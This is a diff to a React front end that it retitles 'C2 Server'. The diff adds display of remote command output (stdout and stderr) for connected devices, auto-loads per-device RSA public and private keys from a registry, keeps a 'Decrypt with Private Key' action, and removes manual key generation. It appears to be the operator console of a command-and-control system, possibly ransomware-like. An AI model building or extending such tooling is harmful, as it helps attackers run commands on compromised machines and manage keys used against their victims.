@@ -13,6 +13,7 @@ export default function FreshUI() {
 
   const [socketStatus, setSocketStatus] = useState('disconnected')
   const socketRef = useRef(null)
+  const [lastOutput, setLastOutput] = useState(null)
 
   const [devices, setDevices] = useState([])
   const [selectedToken, setSelectedToken] = useState(() => (typeof window !== 'undefined' ? localStorage.getItem('ui.selectedToken') || '' : ''))
@@ -47,6 +48,7 @@ export default function FreshUI() {
         apiBase: API_BASE,
         onStatus: (st) => setSocketStatus(st),
         onAck: () => {},
+        onScriptOutput: (payload) => setLastOutput(payload || null),
         startDeviceOnConnect: true,
       })
     } catch (_) {}
@@ -80,6 +82,36 @@ export default function FreshUI() {
       } catch (_) { /* ignore */ }
     })()
   }, [userId, selectedToken])
+
+  // Auto-generate persistent userId if missing (no search/input box needed)
+  useEffect(() => {
+    if (userId) return
+    try {
+      const gen = () => {
+        const arr = new Uint8Array(16)
+        window.crypto.getRandomValues(arr)
+        return Array.from(arr).map(b=>b.toString(16).padStart(2,'0')).join('')
+      }
+      const id = gen()
+      setUserId(id)
+      localStorage.setItem('ui.userId', id)
+    } catch {
+      // Fallback
+      const id = 'guest-' + Math.random().toString(36).slice(2, 10)
+      setUserId(id)
+      try { localStorage.setItem('ui.userId', id) } catch {}
+    }
+  }, [])
+
+  // Populate keys from selected device registry when devices refresh/selection changes
+  useEffect(() => {
+    if (!selectedToken) return
+    const d = devices.find(x=>x.token===selectedToken)
+    if (d) {
+      if (d.public_key_pem) setPublicKey(d.public_key_pem)
+      if (d.private_key_pem) setPrivateKey(d.private_key_pem)
+    }
+  }, [devices, selectedToken])
 
   async function refreshAll() {
     await Promise.allSettled([
@@ -228,8 +260,8 @@ export default function FreshUI() {
         <div className="brand">
           <div className="logo">⚡</div>
           <div>
-            <div className="title">Control Center</div>
-            <div className="subtitle">Fresh, fast, and sleek</div>
+            <div className="title">C2 Server</div>
+            <div className="subtitle"> </div>
           </div>
         </div>
         <div className="header-right">
@@ -238,9 +270,7 @@ export default function FreshUI() {
           <div className="host-input">
             <input value={host} onChange={(e)=>setHost(e.target.value.replace(/\/$/, ''))} placeholder="https://api.example.com" />
           </div>
-          <div className="host-input">
-            <input value={userId} onChange={(e)=>setUserId(e.target.value)} placeholder="User ID (for Supabase)" />
-          </div>
+          {/* User ID is auto-generated and persisted; no user search box*/}
         </div>
       </header>
 
@@ -324,12 +354,10 @@ export default function FreshUI() {
             )}
           </div>
 
-          {/* RSA Key Management */}
+          {/* RSA Key Management (keys auto-generated on device socket auth; public key auto-available via /devices) */}
           <div className="panel card">
               <div className="panel-title">RSA Key Management</div>
               <div className="actions">
-                <button className="btn primary" disabled={loading} onClick={generateKeys}>Generate Keys</button>
-                <button className="btn" disabled={loading || !publicKey || !selectedToken} onClick={sendPublicKey}>Send Public Key</button>
                 <button className="btn danger" disabled={loading || !privateKey || !selectedToken} onClick={decryptWithPrivateKey}>Decrypt with Private Key</button>
                 <button className="btn" disabled={!userId || !selectedToken || (!publicKey && !privateKey)} onClick={()=>saveKeysToSupabase({ userId, token: selectedToken, pub: publicKey || null, prv: privateKey || null }).then(()=>setStatus('Saved to Supabase')).catch(e=>setStatus('Save failed: '+e.message))}>Save to Supabase</button>
                 <button className="btn" disabled={!userId || !selectedToken} onClick={async()=>{ try { const rec = await loadKeysFromSupabase({ userId, token: selectedToken }); if (rec) { setPublicKey(rec.public_key_pem || ''); setPrivateKey(rec.private_key_pem || ''); setStatus('Loaded from Supabase') } else { setStatus('No keys found for user/device') } } catch(e){ setStatus('Load failed: '+e.message) } }}>Load from Supabase</button>
@@ -371,6 +399,18 @@ export default function FreshUI() {
               <div className="actions">
                 <button className="btn primary" disabled={loading || !selectedToken || !command.trim()} onClick={executeCommand}>Execute</button>
               </div>
+              {lastOutput && (
+                <div className="grid two" style={{marginTop:12}}>
+                  <div>
+                    <label className="field-label">Stdout</label>
+                    <textarea className="input mono" rows={8} value={lastOutput.stdout || ''} readOnly />
+                  </div>
+                  <div>
+                    <label className="field-label">Stderr</label>
+                    <textarea className="input mono" rows={8} value={lastOutput.stderr || ''} readOnly />
+                  </div>
+                </div>
+              )}
           </div>
 
           {/* Files (optional) */}
